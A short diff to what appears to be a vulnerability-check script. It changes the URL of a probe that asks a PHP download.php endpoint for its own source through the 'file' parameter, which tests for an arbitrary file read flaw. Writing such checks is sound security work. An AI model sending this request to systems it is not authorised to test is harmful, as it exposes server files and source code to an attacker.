@@ -87,7 +87,7 @@ class check():
 	
 
     def test_check(self):
-	res = http('get',host,port,'/download.php?file=/var/www/html/admin/download.php','',headers)
+	res = http('get',host,port,'/admin/download.php?file=/var/www/html/admin/download.php','',headers)
 	if 'readfile' in res:
 	    return True
 	if debug:
